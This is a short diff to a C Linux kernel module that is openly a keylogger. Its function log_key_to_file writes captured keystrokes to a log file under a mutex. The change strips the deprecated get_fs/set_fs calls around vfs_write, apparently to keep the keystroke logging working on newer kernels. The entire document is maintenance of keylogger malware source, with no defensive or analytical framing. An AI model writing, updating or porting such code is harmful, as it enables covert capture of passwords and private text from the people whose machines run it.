@@ -40,7 +40,6 @@ static char keycode_to_char(unsigned int code) {
 static void log_key_to_file(char key) {
     char log_entry[64];
     int len;
-    mm_segment_t old_fs;
 
     if (key == '\0')  
         return;
@@ -52,15 +51,10 @@ static void log_key_to_file(char key) {
     mutex_lock(&keylog_mutex);
 
     if (file) {
-        old_fs = get_fs(); 
-        set_fs(KERNEL_DS); 
-
-        vfs_write(file, log_entry, len, &file->f_pos); 
-
-        set_fs(old_fs); 
+        vfs_write(file, log_entry, len, &file->f_pos);  
     }
 
-    mutex_unlock(&keylog_mutex);  
+    mutex_unlock(&keylog_mutex); 
 }
 
 
